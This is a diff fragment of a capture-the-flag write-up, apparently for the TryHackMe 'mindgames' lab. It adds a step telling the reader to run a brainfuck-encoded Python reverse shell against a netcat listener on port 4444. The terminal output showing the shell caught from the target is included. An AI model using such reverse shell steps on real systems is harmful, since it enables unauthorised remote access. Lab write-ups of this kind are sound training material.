@@ -81,5 +81,15 @@ nc -lvnp 4444
 ```
 
 #### Execution:
-N
+with the netcat listener running, we just need to execute the brainfuck python reverse shell code.  
+if you followed all steps correctly, you should get a shell just like this;  
+```bash
+┌─[krill@anonsurf]─[~/Boxes/THM/mindgames]
+└──╼ $nc -lvnp 4444 
+listening on [any] 4444 ...
+connect to [10.2.126.43] from (UNKNOWN) [10.10.142.47] 49824
+bash: cannot set terminal process group (734): Inappropriate ioctl for device
+bash: no job control in this shell
+mindgames@mindgames:~/webserver$ 
+```
 
